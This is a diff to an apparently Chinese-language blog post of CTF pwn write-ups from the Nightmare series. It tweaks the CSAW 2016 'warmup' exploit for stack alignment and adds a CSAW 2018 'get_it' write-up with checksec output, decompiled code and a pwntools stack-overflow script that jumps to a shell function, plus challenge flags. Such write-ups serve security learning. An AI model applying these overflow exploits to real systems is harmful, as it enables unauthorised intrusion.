@@ -1,7 +1,7 @@
 ---
 title: 'Writeups: Nightmare Series'
 date: '2024-07-24'
-lastmod: '2024-07-27'
+lastmod: '2024-07-29'
 tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
 draft: false
 summary: 'Writeups for Nightmare Series'
@@ -435,6 +435,8 @@ WOW:0x40060d
  - [C 语言函数调用栈（一）](http://www.cnblogs.com/clover-toeic/p/3755401.html)
  - [C 语言函数调用栈（二）](http://www.cnblogs.com/clover-toeic/p/3756668.html)
 
+还有一点就是确保 [栈对齐](https://www.cubeyond.net/blog/pwn-notes/stack/return-oriented-programming/stack-alignment)。
+
 ### Exploit
 
 ```python
@@ -446,17 +448,87 @@ context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
 
 target = process('./warmup')
 
-gdb.attach(target, 'b *main+135')
-pause()
-
-payload = b'A' * (64 + 8) + p64(0x40060d)
+# payload = b'A' * (64 + 8) + p64(0x40060d + 0x1)
+payload = b'A' * (64 + 8) + p64(0x4006a4) + p64(0x40060d)
 
 target.sendline(payload)
-pause()
 target.interactive()
 ```
 
 ### Flag
 
 Flag: `FLAG{LET_US_BEGIN_CSAW_2016}`
+
+## CSAW Quals 2018 Get It
+
+### Information
+
+ - Category: Pwn
+ - Points: 100
+
+### Description
+
+> Do you get it?
+
+<Download name="get_it" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/csaw18_getit/get_it" type="Binary" />
+
+### Writeup
+
+```plain-text
+λ ~/ file get_it
+get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
+λ ~/ pwn checksec get_it
+[*] '/get_it'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+```plain-text
+λ ~/ ./get_it
+Do you gets it??
+i will
+```
+伪代码如下：
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4[32]; // [rsp+10h] [rbp-20h] BYREF
+
+  puts("Do you gets it??");
+  gets(v4);
+  return 0;
+}
+```
+
+```c
+int give_shell()
+{
+  return system("/bin/bash");
+}
+```
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import *
+
+context(os='linux', arch='amd64', log_level='debug', terminal='kitty')
+
+target = process('./get_it')
+
+payload = b'A' * (0x20 + 0x8) + p64(0x4005f7) + p64(0x4005b6)
+
+target.sendline(payload)
+target.interactive()
+```
+
+### Flag
+
+Flag: `flag{y0u_deF_get_itls}`
 
